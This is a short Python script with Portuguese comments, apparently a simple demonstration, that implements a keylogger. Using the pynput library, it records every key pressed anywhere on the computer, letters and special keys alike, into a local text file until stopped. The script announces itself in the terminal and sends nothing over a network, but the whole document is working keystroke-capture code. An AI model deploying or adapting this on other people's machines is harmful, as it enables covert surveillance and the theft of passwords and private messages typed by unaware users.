from pynput import keyboard
import logging

# Configurando o arquivo onde as teclas serão salvas
logging.basicConfig(filename=("teclas_capturadas.txt"), level=logging.DEBUG, format='%(message)s')

def ao_pressionar(tecla):
    try:
        # Se for uma letra ou número normal
        logging.info(str(tecla.char))
    except AttributeError:
        # Se for uma tecla especial (Espaço, Enter, Shift)
        logging.info(f"[{str(tecla)}]")

print("Keylogger rodando... Digite algo em qualquer lugar do PC.")
print("Aperte 'CTRL + C' no terminal para parar.")

# Iniciando a escuta do teclado
with keyboard.Listener(on_press=ao_pressionar) as listener:
    listener.join()
